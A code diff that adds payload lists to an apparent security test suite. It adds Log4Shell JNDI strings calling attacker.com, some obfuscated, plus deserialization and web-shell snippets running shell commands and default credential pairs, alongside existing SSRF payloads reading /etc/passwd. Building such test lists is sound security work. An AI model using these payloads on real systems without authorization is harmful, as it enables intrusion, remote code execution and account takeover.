@@ -117,6 +117,34 @@ class ComprehensiveTestSuite:
                 "file:///etc/passwd",
                 "dict://localhost:11211/stats",
                 "gopher://localhost:6379/_INFO"
+            ],
+
+            'log4shell': [
+                '${jndi:ldap://attacker.com/a}',
+                '${jndi:dns://attacker.com/a}',
+                '${jndi:rmi://attacker.com/a}',
+                '${${lower:j}ndi:${lower:l}dap://attacker.com/a}'
+            ],
+
+            'insecure_deserialization': [
+                'O:4:"User":2:{s:4:"name";s:5:"admin";s:8:"is_admin";b:1;}',
+                '__import__("os").system("id")',
+                'cPickle.loads(...)',
+                '{"RCE": "..."}'
+            ],
+
+            'web_shell': [
+                '<% Response.Write("hello") %>',
+                '<?php echo shell_exec("id"); ?>',
+                'system("id")',
+                '<jsp:scriptlet>out.println("Hello");</jsp:scriptlet>'
+            ],
+
+            'credential_stuffing': [
+                'admin:admin',
+                'admin:password',
+                'root:toor',
+                'user:12345'
             ]
         }
         
